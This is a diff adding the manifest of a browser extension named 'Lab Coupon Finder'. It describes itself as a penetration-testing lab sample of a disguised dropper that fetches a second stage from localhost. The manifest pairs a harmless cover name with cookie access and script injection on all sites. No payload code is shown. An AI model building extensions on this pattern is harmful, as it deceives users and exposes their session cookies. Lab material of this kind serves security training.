@@ -1,0 +1,12 @@
+{
+  "manifest_version": 3,
+  "name": "Lab Coupon Finder",
+  "version": "1.0.0",
+  "description": "PENT-02 lab sample: a 'clean dropper'. Looks harmless, but downloads and runs a second stage. Every URL points to 127.0.0.1.",
+  "permissions": ["cookies", "scripting", "storage", "alarms"],
+  "host_permissions": ["<all_urls>"],
+  "background": { "service_worker": "sw.js" },
+  "content_scripts": [
+    { "matches": ["<all_urls>"], "js": ["inject.js"] }
+  ]
+}
